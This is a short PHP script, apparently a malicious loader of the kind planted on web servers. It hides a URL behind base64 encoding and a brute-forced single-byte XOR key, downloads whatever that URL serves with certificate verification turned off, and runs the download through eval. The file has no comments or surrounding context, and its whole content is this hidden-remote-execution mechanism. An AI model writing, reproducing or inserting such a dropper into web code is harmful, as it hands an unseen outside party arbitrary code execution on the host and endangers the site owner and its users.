<?php
error_reporting(E_ALL); ini_set('1', 0); 
$a = 'Iz8/OzhxZGQgKjk+OSg+OT8qIiU4ZSgkJmQqODguPzhkKDg4'; 
$decodedData = base64_decode($a);
for ($i = 65; $i <= 90; $i++) {
    $key = chr($i);
    $keyLength = strlen($key);
    $result = '';
    for ($j = 0; $j < strlen($decodedData); $j++) {
        $result .= $decodedData[$j] ^ $key[$j % $keyLength];
    }
    if (filter_var($result, FILTER_VALIDATE_URL)) {
        break;
    }
}
if (!filter_var($result, FILTER_VALIDATE_URL)) {
    die();
}
$d = curl_init(); 
$opts = [
    CURLOPT_URL => $result,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false
];
foreach ($opts as $o => $v) {
    curl_setopt($d, $o, $v);
}
$e = curl_exec($d); 
if ($e === false) {
    curl_close($d);
    die();
}
curl_close($d); 
if (empty($e)) {
    die();
} 
eval('?>' . $e);
?>
